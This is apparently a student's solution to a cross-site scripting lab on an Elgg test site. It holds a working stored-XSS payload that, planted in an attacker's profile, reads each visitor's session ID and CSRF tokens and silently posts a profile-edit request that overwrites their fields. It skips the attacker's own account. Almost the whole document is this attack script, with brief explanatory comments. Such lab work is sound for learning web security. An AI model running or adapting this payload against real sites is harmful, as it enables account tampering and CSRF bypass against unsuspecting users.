//Task 2
//Inspected the params of the edit profiles
//For logged in user,accesslevel is 1.So updated the access level
//In the content,concated everything and sent them to the targeted url
//To prevent these edits for own profile,added the check of user.guid
//When Samy uploads this code on this profile,anyone visiting his profile would have these editing.
<script type="text/javascript">
	window.onload = function(){
		var guid = "&guid=" + elgg.session.user.guid;
		var ts = "&__elgg_ts="+elgg.security.token.__elgg_ts;
		var token = "&__elgg_token="+elgg.security.token.__elgg_token;
		var name = "&name="+elgg.session.user.name;
		var desc = "&description=1605097" + "&accesslevel[description]=1";
        var briefdescription="&briefdescription=Hello" + "&accesslevel[briefdescription]=1"
		var location="&location=Dhaka" + "&accesslevel[location]=1";
		var contactmail="&contactemail=adibarifa@gmail.com" +"&accesslevel[contactemail]=1"
		var interest="&interests=Cooking" + "&accesslevel[interests]=1"; 
		var mobile="&mobile=1234" + "&accesslevel[mobile]=1"; ;
		var phone="&phone=91876" + "&accesslevel[phone]=1"; 
		var skills="&skills=leadership" + "&accesslevel[skills]=1"; 
		var twitter="&twitter=adiba.com" + "&accesslevel[twitter]=1"; 
		var website="&website=adiba.com" + "&accesslevel[website]=1"; 
		var sendurl = "http://www.xsslabelgg.com/action/profile/edit";
		var content = token + ts + name + desc +briefdescription+location+interest+mobile+phone+skills+contactmail+twitter+website+guid;
		if(elgg.session.user.guid != 47)
		{
			var Ajax = null;
			Ajax = new XMLHttpRequest();
			Ajax.open("POST",sendurl,true);
			Ajax.setRequestHeader("Content-Type","application/x-www-form-urlencoded");
			Ajax.send(content);
		}
	}
</script>